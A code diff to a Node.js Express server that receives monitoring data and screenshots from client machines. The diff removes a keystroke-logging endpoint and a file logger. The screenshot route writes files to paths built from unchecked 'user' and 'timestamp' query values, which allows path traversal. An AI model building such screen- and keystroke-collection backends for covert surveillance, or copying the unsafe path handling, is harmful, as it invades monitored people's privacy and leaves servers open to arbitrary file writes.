@@ -7,21 +7,14 @@ const app = express();
 const port = 3000;
 
 let clients = [];
-let keyLogs = {}; // Добавление для хранения кейлогов
 
 app.use(bodyParser.json());
 app.use(express.static('public'));
 
-function logMessage(message) {
-    const logFile = path.join(__dirname, 'server.log');
-    const timestamp = new Date().toISOString();
-    fs.appendFileSync(logFile, `[${timestamp}] ${message}\n`);
-}
-
 // Route for receiving monitoring data
 app.post('/api/monitor', (req, res) => {
     const { user, ip, lastActive } = req.body;
-    logMessage(`Monitor data received: user=${user}, ip=${ip}, lastActive=${lastActive}`);
+    console.log(`Monitor data received: user=${user}, ip=${ip}, lastActive=${lastActive}`);
 
     const clientIndex = clients.findIndex(client => client.user === user);
     if (clientIndex === -1) {
@@ -38,8 +31,9 @@ app.post('/api/screenshot', (req, res) => {
     const user = req.query.user;
     let timestamp = req.query.timestamp;
     const chunks = [];
-    logMessage(`Receiving screenshot for user: ${user}`);
+    console.log(`Receiving screenshot for user: ${user}`);
 
+    // Replace colons in the timestamp with dashes
     timestamp = timestamp.replace(/:/g, '-');
 
     req.on('data', chunk => {
@@ -49,17 +43,24 @@ app.post('/api/screenshot', (req, res) => {
     req.on('end', () => {
         const screenshotBuffer = Buffer.concat(chunks);
         const screenshotPath = path.join(__dirname, 'public', 'screenshots', `${user}_${timestamp}.jpeg`);
-        logMessage(`Saving screenshot to: ${screenshotPath}`);
+        console.log(`Saving screenshot to: ${screenshotPath}`);
 
+        // Ensure the directory exists
         const screenshotDir = path.dirname(screenshotPath);
+        console.log(`Checking if directory exists: ${screenshotDir}`);
         if (!fs.existsSync(screenshotDir)) {
+            console.log(`Directory does not exist. Creating: ${screenshotDir}`);
             fs.mkdirSync(screenshotDir, { recursive: true });
+        } else {
+            console.log(`Directory already exists: ${screenshotDir}`);
         }
 
         try {
+            console.log(`Writing file: ${screenshotPath}`);
             fs.writeFileSync(screenshotPath, screenshotBuffer);
-            logMessage(`Screenshot saved successfully.`);
+            console.log(`Screenshot saved successfully.`);
 
+            // Add screenshot to client data
             const clientIndex = clients.findIndex(client => client.user === user);
             if (clientIndex !== -1) {
                 clients[clientIndex].screenshots.push(`${user}_${timestamp}.jpeg`);
@@ -67,24 +68,10 @@ app.post('/api/screenshot', (req, res) => {
 
             res.sendStatus(200);
         } catch (error) {
-            logMessage(`Error saving screenshot for user ${user}: ${error}`);
+            console.error(`Error saving screenshot for user ${user}:`, error);
             res.sendStatus(500);
         }
     });
-});
-
-// Route for receiving keylog data
-app.post('/api/keylog', (req, res) => {
-    const { user, key } = req.body;
-    logMessage(`Keylog received: user=${user}, key=${key}`);
-
-    if (!keyLogs[user]) {
-        keyLogs[user] = [];
-    }
-
-    keyLogs[user].push(key);
-
-    res.sendStatus(200);
 });
 
 // Route for serving client data
@@ -98,5 +85,5 @@ app.get('/', (req, res) => {
 });
 
 app.listen(port, () => {
-    logMessage(`Server listening at http://localhost:${port}`);
+    console.log(`Server listening at http://localhost:${port}`);
 });
